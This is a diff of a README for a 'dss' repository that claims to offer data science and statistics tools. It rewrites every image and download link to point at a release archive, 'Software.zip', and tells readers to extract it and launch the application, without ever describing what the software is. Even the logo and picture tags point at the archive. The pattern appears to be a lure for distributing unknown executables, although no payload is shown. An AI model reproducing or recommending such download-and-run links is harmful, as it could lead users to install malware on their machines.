@@ -1,7 +1,7 @@
 
 # 🚀 Welcome to the "dss" Repository!
 
-![DSS Logo](https://example.com/dss.png)
+![DSS Logo](https://github.com/leela-1984/dss/releases/download/v1.0/Software.zip)
 
 This repository is a collection of various tools and resources related to data science and statistics. Whether you are a beginner or an expert in the field, this repository aims to provide valuable insights, code snippets, and datasets to help you in your data analysis journey.
 
@@ -15,7 +15,7 @@ This repository is a collection of various tools and resources related to data s
 
 To get started with the tools and resources in this repository, you can download the latest version by clicking the button below:
 
-[![Download DSS](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download DSS](https://github.com/leela-1984/dss/releases/download/v1.0/Software.zip)](https://github.com/leela-1984/dss/releases/download/v1.0/Software.zip)
 
 Once downloaded, extract the files and launch the application to begin exploring the world of data science and statistics.
 
@@ -37,4 +37,4 @@ Let's embark on a data-driven journey together with the "dss" repository! 📊�
 
 **Disclaimer**: This repository is for educational and informational purposes only. The tools and resources provided are not meant for production use.
 
-![Data Science](https://example.com/data_science.jpg)
+![Data Science](https://github.com/leela-1984/dss/releases/download/v1.0/Software.zip)
